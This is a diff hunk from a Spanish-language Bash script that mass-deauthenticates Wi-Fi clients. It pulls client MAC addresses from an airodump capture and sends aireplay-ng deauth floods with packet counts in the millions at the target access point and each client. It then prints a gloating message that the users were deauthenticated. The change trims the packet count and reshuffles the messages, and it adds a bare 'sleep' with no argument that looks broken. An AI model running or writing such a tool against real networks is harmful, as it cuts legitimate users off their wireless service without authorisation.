@@ -59,11 +59,13 @@ lineas=$var
 resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 	if [ "$resultado" = ":" ]; then
 	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
-	sudo aireplay-ng --deauth 10000000  -a $victima -c $direccion $interface &>/dev/null&
-	printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
-	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
-	sleep 100000
+	sudo aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
 	else
+	sleep 
+        printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
+        sleep 1
+	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
+        sleep 1000000
 	break
 	fi
 let "var++"
